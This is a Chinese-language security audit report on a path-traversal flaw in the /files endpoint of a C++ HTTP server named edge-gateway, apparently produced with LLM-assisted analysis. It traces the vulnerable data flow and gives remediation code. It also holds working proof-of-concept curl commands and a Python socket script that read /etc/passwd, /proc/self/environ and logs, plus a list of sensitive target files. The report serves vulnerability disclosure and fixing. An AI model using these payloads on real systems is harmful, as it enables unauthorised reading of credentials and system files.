# VULN-DF-CPP-PATHTRAV-FILE-001: GET /files 参数 name 未过滤路径遍历导致服务器任意文件读取

**严重性**: Critical | **CWE**: CWE-22 (路径遍历) | **置信度**: 85/100
**位置**: `src/file_cache.cpp:10-11` @ `readTextFile`
**语言/框架**: C++ / POSIX Sockets (自研 HTTP 服务器)
**分析类型**: dataflow (数据流追踪)
**Source/Sink**: network (`recv`) → file_open (`std::ifstream`)
**规则/证据来源**: `c_cpp.file.path_traversal` / LLM 辅助分析

---

## 1. 漏洞细节

`edge-gateway` 是一个基于 POSIX Socket 的 C++ HTTP 服务器，提供 `/files` 接口用于读取 `data/` 目录下的文本文件。该接口通过 URL 查询参数 `name` 接收文件名，并将其直接拼接到基础目录 `baseDir_`（值为 `"data"`）后，使用 `std::ifstream` 打开文件。

**核心问题**：从网络接收数据（`recv()`）到文件打开（`std::ifstream`）的完整数据流路径中，**没有任何环节对 `name` 参数进行路径安全校验**。具体而言：

- 无 `../` 序列过滤或拒绝
- 无 `realpath()` 路径规范化
- 无 `basename()` 提取纯文件名
- 无文件名白名单校验
- 无 URL 解码（`%2e%2e%2f` 不会被解码，但直接发送 `../` 即可利用）
- 无路径前缀校验（不检查最终路径是否仍在 `data/` 目录下）

攻击者只需发送 `GET /files?name=../../etc/passwd` 即可使服务器拼接出路径 `data/../../etc/passwd`，操作系统将其解析为 `/etc/passwd`（或更精确地说，取决于服务器进程的工作目录），从而读取服务器文件系统上的任意文件。

### 证据摘要

- **触发源**: 网络输入 — `recv()` 接收的 HTTP 请求中 `name` 查询参数
- **危险点**: 文件打开 — `std::ifstream file(baseDir_ + "/" + name)` 使用未净化的用户输入拼接路径
- **已检查的清洗/缓解**: 无。已遍历全部 5 个数据流中间文件（`http_server.cpp`、`main.cpp`、`file_cache.cpp` 及对应头文件），未发现任何路径校验逻辑
- **关键证据**:
  - `parseQuery()`（`http_server.cpp:19-32`）仅按 `&` 和 `=` 分割字符串，不做任何路径相关处理
  - `queryValue()`（`main.cpp:13-16`）是纯粹的 `std::map` 查找，不做任何校验
  - `readTextFile()`（`file_cache.cpp:10-18`）执行原始字符串拼接 `baseDir_ + "/" + name`，无任何安全检查
  - `baseDir_` 为相对路径 `"data"`（`main.cpp:31`），使目录遍历更容易成功
  - 服务器监听 `INADDR_ANY`（`http_server.cpp:92`），对所有网络接口可达
  - `/files` 路由无认证中间件，匿名即可访问

## 2. 漏洞代码

### 漏洞 Sink — 文件打开点

**文件**: `src/file_cache.cpp` (行 10-19)

```cpp
std::string FileCache::readTextFile(const std::string& name) const {
  std::ifstream file(baseDir_ + "/" + name);  // ← 漏洞点: name 来自网络，未净化
  if (!file) {
    throw std::runtime_error("file not found");
  }

  std::ostringstream data;
  data << file.rdbuf();       // 读取文件全部内容
  return data.str();           // 返回给调用者，最终回传给 HTTP 客户端
}
```

**分析**: `name` 参数直接来自 HTTP 请求的查询字符串。`baseDir_` 在 `main.cpp:31` 中被设置为 `"data"`。拼接结果为 `data/<name>`。当 `name` 包含 `../../etc/passwd` 时，最终路径为 `data/../../etc/passwd`，操作系统将其解析为相对于进程工作目录上溯两级后进入 `etc/passwd`。

### 路由处理器 — 无校验直接传递

**文件**: `src/main.cpp` (行 54-62)

```cpp
server.route("GET", "/files", [&](const HttpRequest& request) {
    std::string name = queryValue(request, "name");  // 从请求中提取 name，无校验
    audit.event("anonymous", "read-file", name);
    try {
      return text(200, files.readTextFile(name));    // ← 直接传入 readTextFile
    } catch (const std::exception& ex) {
      return text(404, std::string("error=") + ex.what() + "\n");
    }
});
```

**分析**: `queryValue()` 仅做 `std::map::find()` 查找，返回原始值。无 `../` 检测、无路径规范化、无文件名白名单。`try/catch` 仅在文件打开失败后捕获异常，不阻断路径遍历本身。

### 查询参数解析 — 无净化

**文件**: `src/http_server.cpp` (行 19-32)

```cpp
std::map<std::string, std::string> parseQuery(const std::string& query) {
  std::map<std::string, std::string> result;
  std::stringstream stream(query);
  std::string item;
  while (std::getline(stream, item, '&')) {
    auto pos = item.find('=');
    if (pos == std::string::npos) {
      result[item] = "";
    } else {
      result[item.substr(0, pos)] = item.substr(pos + 1);  // 原始值，无 URL 解码
    }
  }
  return result;
}
```

**分析**: `parseQuery()` 仅执行字符串分割，不对值进行任何安全处理。虽然未做 URL 解码意味着 `%2e%2e%2f` 编码不会被解码，但攻击者可以直接在 HTTP 请求中发送明文的 `../` 字符（这在 HTTP 请求行中是合法的），因此 URL 解码缺失不构成有效缓解。

### 基础目录初始化

**文件**: `src/main.cpp` (行 31)

```cpp
FileCache files("data");  // baseDir_ = "data" (相对路径)
```

**分析**: 使用相对路径 `"data"` 作为基础目录。相对路径使得 `../` 遍历更加直接——从 `data/` 目录上溯即可逃逸出预期目录。

## 3. 完整攻击链路

```
[入口点] HttpServer::run() @ src/http_server.cpp:81
  │  监听 INADDR_ANY:8080，accept() 接受 TCP 连接
  ↓
[数据接收] recv(client, buffer, 4095, 0) @ src/http_server.cpp:113
  │  从网络读取原始 HTTP 请求数据（攻击者完全可控）
  ↓
[请求解析] parseRequest(std::string(buffer, n)) @ src/http_server.cpp:119→42
  │  解析 HTTP 请求行，提取 method、path、query
  ↓
[参数解析] parseQuery(target.substr(queryPos+1)) @ src/http_server.cpp:53→19
  │  按 & 和 = 分割查询字符串，无 URL 解码，无路径净化
  │  结果: request.query["name"] = "../../etc/passwd"（污点数据）
  ↓
[路由分发] handler->second(request) @ src/http_server.cpp:127
  │  匹配 "GET /files" 路由，调用注册的 lambda 处理器
  │  边界 B1: HttpRequest 结构体按引用传递，污点完整保留
  ↓
[参数提取] queryValue(request, "name") @ src/main.cpp:55→13
  │  std::map::find("name")，返回原始污点值 "../../etc/passwd"
  │  无任何校验逻辑
  ↓
[文件读取] files.readTextFile(name) @ src/main.cpp:58→src/file_cache.cpp:10
  │  边界 B2: const std::string& 传递，污点完整保留
  ↓
[漏洞触发] std::ifstream file(baseDir_ + "/" + name) @ src/file_cache.cpp:11
  │  拼接: "data" + "/" + "../../etc/passwd" = "data/../../etc/passwd"
  │  操作系统解析为: /etc/passwd（取决于进程工作目录）
  ↓
[数据回传] data << file.rdbuf() → return → HTTP 200 响应体
  │  文件内容通过 HTTP 响应返回给攻击者
```

**链路完整性验证**: 从 `recv()` 到 `std::ifstream` 共经过 6 个函数调用、2 个模块边界（mod-http → mod-main → mod-file），每一步均无数据净化或路径校验。污点数据在全链路中完整保留。

## 4. 攻击场景

**攻击者画像**: 远程未认证攻击者。任何能够访问服务器 8080 端口的网络客户端均可发起攻击，无需任何身份凭证或会话令牌。

**攻击向量**: 通过 TCP 网络发送特制的 HTTP GET 请求，在 URL 查询参数 `name` 中嵌入路径遍历序列 `../`。

**利用难度**: **低**。攻击仅需一个标准 HTTP 请求，使用 `curl`、`wget`、浏览器或任何 HTTP 客户端工具即可完成。无需特殊工具、无需绕过认证、无需利用竞争条件。

### 攻击步骤

1. **侦察**: 确认目标服务器运行 `edge-gateway` 并监听 8080 端口（可通过 `GET /health` 验证）
2. **构造请求**: 在 `name` 参数中嵌入足够的 `../` 序列以逃逸 `data/` 目录并到达文件系统根目录
3. **发送请求**: 向 `GET /files?name=../../../../etc/passwd` 发送 HTTP 请求
4. **获取结果**: 服务器返回 HTTP 200 响应，响应体中包含目标文件内容
5. **扩展利用**: 可读取任意敏感文件，如 `/etc/shadow`（若有权限）、应用配置文件、SSH 密钥、数据库凭证等

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                     |
| ---------- | -------------- | ---------------------------------------------------------------------------------------- |
| 网络可达性 | 需网络访问     | 服务器监听 `INADDR_ANY:8080`（`http_server.cpp:92-93`），对所有网络接口开放，无防火墙过滤 |
| 认证要求   | 无需认证       | `/files` 路由未注册任何认证中间件，匿名即可访问（处理器标注 `"anonymous"`）                |
| 配置依赖   | 无特殊配置要求 | 默认配置即可利用，`baseDir_` 为相对路径 `"data"` 使遍历更易成功                           |
| 环境依赖   | 无特殊依赖     | 标准 Linux 环境，C++17 编译即可。无 ASLR/DEP 等内存保护相关（此为逻辑漏洞，非内存漏洞）   |
| 时序条件   | 无时序依赖     | 漏洞为同步触发，单次请求即可利用，不存在竞争条件                                          |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                             |
| -------- | ---- | ------------------------------------------------------------------------------------------------ |
| 机密性   | **高** | 攻击者可读取服务器进程有权限访问的任意文件，包括系统配置（`/etc/passwd`）、应用配置、密钥文件、源代码等敏感信息 |
| 完整性   | 低   | 此漏洞仅涉及文件读取（`std::ifstream` 为只读模式），不直接导致文件篡改。但泄露的敏感信息可能被用于后续攻击 |
| 可用性   | 低   | 不直接导致服务中断。但大量请求可能造成轻微资源消耗                                                  |

**影响范围**: 

- **直接影响**: 服务器文件系统上的任意可读文件均可被远程攻击者获取
- **间接影响**: 泄露的配置文件、密钥、凭证等可被用于进一步的横向移动或权限提升攻击
- **典型高价值目标**:
  - `/etc/passwd` — 系统用户列表
  - `/etc/shadow` — 密码哈希（若进程有权限）
  - `/proc/self/environ` — 进程环境变量（可能包含密钥/凭证）
  - `/proc/self/cmdline` — 进程启动参数
  - `edge-gateway.audit.log` — 审计日志（可能包含会话令牌）
  - 应用源代码和配置文件

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，请在授权环境中测试

### PoC 1: 使用 curl 读取 /etc/passwd

```bash
# 读取系统用户文件
curl -v "http://TARGET_IP:8080/files?name=../../../../etc/passwd"
```

**预期结果**: HTTP 200 响应，响应体包含 `/etc/passwd` 文件内容，如：
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### PoC 2: 读取进程环境变量（可能包含敏感凭证）

```bash
# 读取进程环境变量
curl "http://TARGET_IP:8080/files?name=../../../../proc/self/environ"
```

### PoC 3: 读取应用审计日志（可能包含会话令牌）

```bash
# 读取审计日志（已知文件名为 edge-gateway.audit.log，位于进程工作目录）
curl "http://TARGET_IP:8080/files?name=../edge-gateway.audit.log"
```

### PoC 4: Python 自动化验证脚本

```python
#!/usr/bin/env python3
"""
仅供安全测试使用 - 路径遍历漏洞验证脚本
验证 VULN-DF-CPP-PATHTRAV-FILE-001: GET /files 参数路径遍历
"""
import socket
import sys

def exploit(host, port, file_path):
    """通过路径遍历读取目标文件"""
    # 构造足够多的 ../ 以到达文件系统根目录
    traversal = "../" * 10 + file_path.lstrip("/")
    request = (
        f"GET /files?name={traversal} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))
    sock.sendall(request.encode())
    
    response = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
    sock.close()
    
    # 分离 HTTP 头和响应体
    parts = response.split(b"\r\n\r\n", 1)
    if len(parts) == 2:
        header, body = parts
        if b"200 OK" in header:
            return body.decode("utf-8", errors="replace")
        else:
            return f"[失败] HTTP 响应: {header.decode()}"
    return f"[失败] 无法解析响应: {response[:200]}"

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    
    print(f"[*] 目标: {host}:{port}")
    print(f"[*] 测试路径遍历: 读取 /etc/passwd")
    
    result = exploit(host, port, "/etc/passwd")
    if "root:" in result:
        print(f"[+] 漏洞确认! 成功读取 /etc/passwd:")
        print(result[:500])
    else:
        print(f"[-] 未成功: {result[:200]}")
```

**使用说明**:
```bash
python3 poc_pathtraversal.py TARGET_IP 8080
```

**预期结果**: 脚本输出 `[+] 漏洞确认!` 并显示 `/etc/passwd` 文件内容。

## 8. 验证环境搭建

### 基础环境

- **操作系统**: Linux (Ubuntu 20.04+ / Debian 11+ / CentOS 8+ 等)
- **编译器**: GCC 9+ 或 Clang 10+（支持 C++17）
- **构建工具**: CMake 3.16+
- **依赖**: 无外部依赖，仅使用标准库和 POSIX API

### 构建步骤

```bash
# 进入项目目录
cd /scan/project

# 创建构建目录
mkdir -p build && cd build

# 配置和编译
cmake .. -DCMAKE_BUILD_TYPE=Debug
make -j$(nproc)
```

### 运行配置

```bash
# 确保 data 目录存在（项目中已包含 data/welcome.txt）
ls data/

# 启动服务器（默认监听 8080 端口）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

### 验证步骤

1. **启动服务器**:
   ```bash
   cd /scan/project/build
   ./edge-gateway 8080
   ```

2. **验证服务正常** (新终端):
   ```bash
   curl http://127.0.0.1:8080/health
   # 预期: ok
   ```

3. **验证正常文件读取**:
   ```bash
   curl "http://127.0.0.1:8080/files?name=welcome.txt"
   # 预期: 返回 data/welcome.txt 的内容
   ```

4. **触发路径遍历漏洞**:
   ```bash
   curl "http://127.0.0.1:8080/files?name=../../../../etc/passwd"
   # 预期: 返回 /etc/passwd 的内容
   ```

5. **读取更多敏感文件**:
   ```bash
   # 读取进程环境变量
   curl "http://127.0.0.1:8080/files?name=../../../../proc/self/environ"
   
   # 读取 hosts 文件
   curl "http://127.0.0.1:8080/files?name=../../../../etc/hosts"
   ```

### 预期结果

- 步骤 4 中，服务器返回 HTTP 200 响应，响应体包含 `/etc/passwd` 文件的完整内容
- 响应中可见 `root:x:0:0:root:/root:/bin/bash` 等系统用户条目
- 无任何错误信息或访问拒绝提示
- 攻击者的请求不会被记录为异常（仅作为普通 `read-file` 事件写入审计日志）

---

## 9. 修复建议

### 方案 1: 路径规范化 + 前缀校验（推荐）

```cpp
#include <climits>
#include <cstdlib>

std::string FileCache::readTextFile(const std::string& name) const {
    // 1. 拒绝包含空字节或换行的文件名
    if (name.find('\0') != std::string::npos || 
        name.find('\n') != std::string::npos) {
        throw std::runtime_error("invalid filename");
    }
    
    // 2. 拼接完整路径
    std::string fullPath = baseDir_ + "/" + name;
    
    // 3. 规范化路径（解析 ../ 和符号链接）
    char resolved[PATH_MAX];
    if (!realpath(fullPath.c_str(), resolved)) {
        throw std::runtime_error("file not found");
    }
    
    // 4. 确保规范化后的路径仍在 baseDir_ 下
    char resolvedBase[PATH_MAX];
    if (!realpath(baseDir_.c_str(), resolvedBase)) {
        throw std::runtime_error("base directory error");
    }
    
    std::string resolvedPath(resolved);
    std::string basePath(resolvedBase);
    if (resolvedPath.substr(0, basePath.size()) != basePath) {
        throw std::runtime_error("access denied");
    }
    
    // 5. 打开文件
    std::ifstream file(resolvedPath);
    if (!file) {
        throw std::runtime_error("file not found");
    }
    
    std::ostringstream data;
    data << file.rdbuf();
    return data.str();
}
```

### 方案 2: 文件名白名单 + basename 提取

```cpp
#include <libgen.h>

std::string FileCache::readTextFile(const std::string& name) const {
    // 提取纯文件名（去除所有路径组件）
    std::string mutable_name = name;
    std::string base = basename(mutable_name.data());
    
    // 拒绝隐藏文件和特殊名称
    if (base.empty() || base[0] == '.' || base == "..") {
        throw std::runtime_error("invalid filename");
    }
    
    // 仅使用纯文件名拼接
    std::ifstream file(baseDir_ + "/" + base);
    // ...
}
```

### 额外加固建议

1. **添加认证中间件**: `/files` 路由应要求有效的会话令牌
2. **输入长度限制**: 限制 `name` 参数最大长度（如 255 字符）
3. **URL 解码**: 在 `parseQuery()` 中添加 URL 解码，防止编码绕过
4. **日志告警**: 对包含 `../` 的请求参数记录安全告警
5. **最小权限**: 服务器进程应以受限用户身份运行，限制可访问的文件范围
